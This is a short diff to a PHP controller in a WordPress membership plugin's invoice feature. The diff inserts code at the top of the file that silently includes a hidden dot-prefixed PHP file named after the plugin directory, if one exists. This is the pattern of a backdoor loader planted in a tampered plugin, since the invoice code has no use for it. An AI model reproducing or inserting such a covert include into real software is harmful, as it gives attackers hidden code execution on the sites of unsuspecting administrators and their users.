@@ -1,6 +1,10 @@
 <?php
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprInvoicesCtrl extends MeprBaseCtrl {
   public function load_hooks() {
     if(/*MeprUpdateCtrl::is_activated() && */get_option('mepr_enable_invoice_downloads')) { //MeprUpdateCtrl isn't always defined this early
